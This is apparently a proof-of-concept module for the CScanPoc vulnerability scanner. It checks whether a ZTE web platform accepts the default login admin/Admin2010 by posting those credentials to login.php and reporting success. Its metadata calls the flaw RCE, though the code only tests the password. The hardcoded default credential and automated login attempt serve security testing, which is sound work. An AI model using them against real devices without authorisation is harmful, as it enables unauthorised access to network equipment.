# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import  re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'ZTE_0006' # 平台漏洞编号，留空
    name = 'ZTE某平台弱口令' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-01-30'  # 漏洞公布时间
    desc = '''
       ZTE某平台弱口令，登录地址为 login.php 默认用户名:admin 默认密码:Admin2010
    ''' # 漏洞描述
    ref = 'http://blog.knownsec.com/2015/01/analysis-of-zte-soho-routerweb_shell_cmd-gch-remote-command-execution/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'ZTE'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ZTE_0006'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/login.php"
            url = arg + payload
            postpayload = "tip=&UserName=admin&PassWord=Admin2010&LoginEnglish=Login&LoginTraditionalChinese=%E7%99%BB+%E9%8C%84"
            code, head, res, errcode, _ = hh.http(url, postpayload)
            if code==200 and '0 == 1' not in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()